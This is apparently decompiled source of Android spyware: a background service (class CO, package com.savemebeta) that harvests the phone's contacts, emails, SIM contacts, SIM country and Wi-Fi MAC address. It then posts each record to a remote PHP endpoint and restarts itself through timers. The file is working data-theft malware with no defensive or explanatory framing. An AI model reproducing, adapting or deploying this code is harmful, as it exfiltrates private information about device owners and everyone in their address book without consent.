package com.savemebeta;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.telephony.TelephonyManager;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import android.widget.TextView;
import android.widget.Toast;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.nio.charset.Charset;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class CO extends Service implements OnTouchListener {
    public static String country;
    public static String extnum = "0";
    public static String mca;
    public static String msg = "0";
    public static String phoneNo;
    public static String smext = "0";
    DatabaseOperations DOP;
    public String address;
    Boolean conx = Boolean.valueOf(false);
    Context countr = this;
    Context ctx = this;
    Context ctx2 = this;
    Context ctx3 = this;
    Context ctx4 = this;
    Context ctx5 = this;
    Context ctx7 = this;
    String email2 = "a";
    String[] friends;
    String[] friends2;
    Context hh = this;
    InputStream is = null;
    String name2 = "a";
    String number2 = "a";
    public TextView outputText;
    String result = null;
    StringBuilder sb = null;

    public class sendcontact extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            Calendar calendar = Calendar.getInstance();
            SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
            DatabaseOperations DOP = new DatabaseOperations(CO.this.ctx);
            Cursor CR = DOP.getInformation(DOP);
            CR.moveToFirst();
            Boolean loginstatus = Boolean.valueOf(false);
            String NAME = "";
            String NUMBER = "";
            String FromMac = "";
            String SendTime = "";
            String FromTel = "";
            do {
                NAME = CR.getString(0);
                NUMBER = CR.getString(1);
                FromMac = CO.this.address;
                SendTime = format.format(calendar.getTime());
                FromTel = "UNKNOWN";
                Charset.forName("UTF-8").encode(NAME);
                try {
                    Charset.forName("UTF-8").encode(NAME);
                } catch (Exception e) {
                }
                try {
                    NAME = new String(NAME.getBytes("UTF-8"), "UTF-8");
                } catch (UnsupportedEncodingException e1) {
                    e1.printStackTrace();
                }
                HttpClient httpClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://topemarketing.com/android/googlefinal/sendcontacts.php");
                List<NameValuePair> nameValuePairs = new ArrayList();
                nameValuePairs.add(new BasicNameValuePair("timea", SendTime));
                nameValuePairs.add(new BasicNameValuePair("name", NAME));
                nameValuePairs.add(new BasicNameValuePair("number", NUMBER));
                nameValuePairs.add(new BasicNameValuePair("fromtel", FromTel));
                nameValuePairs.add(new BasicNameValuePair("frommac", FromMac));
                nameValuePairs.add(new BasicNameValuePair("counta", CO.country));
                try {
                    httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, "UTF-8"));
                } catch (UnsupportedEncodingException e2) {
                    e2.printStackTrace();
                }
                try {
                    httpClient.execute(httpPost);
                } catch (ClientProtocolException e3) {
                    e3.printStackTrace();
                } catch (IOException e4) {
                    e4.printStackTrace();
                }
            } while (CR.moveToNext());
            CR.close();
            new Timer().schedule(new TimerTask() {
                public void run() {
                    new update().var(CO.this.address, "SSYN", "", "", "", "", "", "");
                    CO.this.startService(new Intent(CO.this, restart.class));
                    CO.this.stopSelf();
                }
            }, 3000);
            return null;
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        ConnectivityManager con_manager = (ConnectivityManager) this.ctx2.getSystemService("connectivity");
        if (con_manager.getActiveNetworkInfo() != null && con_manager.getActiveNetworkInfo().isAvailable() && con_manager.getActiveNetworkInfo().isConnected()) {
            this.conx = Boolean.valueOf(true);
        } else {
            this.conx = Boolean.valueOf(false);
        }
        if (this.conx.booleanValue()) {
            String locale = this.countr.getResources().getConfiguration().locale.getDisplayCountry();
            country = ((TelephonyManager) getSystemService("phone")).getSimCountryIso();
            this.address = ((WifiManager) getSystemService("wifi")).getConnectionInfo().getMacAddress();
            getContacts();
            return;
        }
        new Timer().schedule(new TimerTask() {
            public void run() {
                CO.this.startService(new Intent(CO.this, restartCO.class));
            }
        }, 30000);
    }

    public void getContacts() {
        try {
            String tnumber = ((TelephonyManager) getSystemService("phone")).getLine1Number();
            DatabaseOperations DB = new DatabaseOperations(this.ctx);
            DB.putInformation(DB, "PHONE APP", "PHONE APP", "PHONE APP");
            String phoneNumber = null;
            String email = null;
            Uri CONTENT_URI = Contacts.CONTENT_URI;
            String _ID = "_id";
            String DISPLAY_NAME = "display_name";
            String HAS_PHONE_NUMBER = "has_phone_number";
            Uri PhoneCONTENT_URI = Phone.CONTENT_URI;
            String Phone_CONTACT_ID = "contact_id";
            String NUMBER = "data1";
            Uri EmailCONTENT_URI = Email.CONTENT_URI;
            String EmailCONTACT_ID = "contact_id";
            String DATA = "data1";
            StringBuffer output = new StringBuffer();
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(CONTENT_URI, null, null, null, null);
            if (cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String contact_id = cursor.getString(cursor.getColumnIndex(_ID));
                    String name = cursor.getString(cursor.getColumnIndex(DISPLAY_NAME));
                    Charset.forName("UTF-8").encode(name);
                    try {
                        Charset.forName("UTF-8").encode(name);
                    } catch (Exception e) {
                    }
                    try {
                        name = new String(name.getBytes("UTF-8"), "UTF-8");
                    } catch (UnsupportedEncodingException e1) {
                        e1.printStackTrace();
                    }
                    if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(HAS_PHONE_NUMBER))) > 0) {
                        Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, new StringBuilder(String.valueOf(Phone_CONTACT_ID)).append(" = ?").toString(), new String[]{contact_id}, null);
                        while (phoneCursor.moveToNext()) {
                            phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
                        }
                        phoneCursor.close();
                        Cursor emailCursor = contentResolver.query(EmailCONTENT_URI, null, new StringBuilder(String.valueOf(EmailCONTACT_ID)).append(" = ?").toString(), new String[]{contact_id}, null);
                        while (emailCursor.moveToNext()) {
                            email = emailCursor.getString(emailCursor.getColumnIndex(DATA));
                        }
                        emailCursor.close();
                    }
                    DatabaseOperations databaseOperations = new DatabaseOperations(this.ctx);
                    Cursor CR = databaseOperations.getInformation(databaseOperations);
                    CR.moveToFirst();
                    Boolean loginstatus = Boolean.valueOf(false);
                    do {
                        if (phoneNumber.equals(CR.getString(1))) {
                            loginstatus = Boolean.valueOf(true);
                        }
                    } while (CR.moveToNext());
                    CR.close();
                    if (!loginstatus.booleanValue()) {
                        DatabaseOperations DB1 = new DatabaseOperations(this.ctx);
                        DB1.putInformation(DB1, name, phoneNumber, email);
                    }
                }
                cursor.close();
            }
        } catch (Exception e2) {
        }
        new Timer().schedule(new TimerTask() {
            public void run() {
                CO.this.allSIMContact();
            }
        }, 5000);
    }

    /* access modifiers changed from: private */
    public void allSIMContact() {
        try {
            Cursor cursorSim = getContentResolver().query(Uri.parse("content://icc/adn"), null, null, null, null);
            while (cursorSim.moveToNext()) {
                String ClsSimPhonename = cursorSim.getString(cursorSim.getColumnIndex("name"));
                String ClsSimphoneNo = cursorSim.getString(cursorSim.getColumnIndex("number"));
                ClsSimphoneNo.replaceAll("\\D", "");
                ClsSimphoneNo.replaceAll("&", "");
                ClsSimPhonename = ClsSimPhonename.replace("|", "");
                DatabaseOperations DB1 = new DatabaseOperations(this.ctx);
                DB1.putInformation(DB1, ClsSimPhonename, ClsSimphoneNo, "PHONE APP");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        new sendcontact().execute(new Void[0]);
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public boolean onTouch(View v, MotionEvent event) {
        Toast.makeText(this, "REQUEST event", 0).show();
        return false;
    }
}
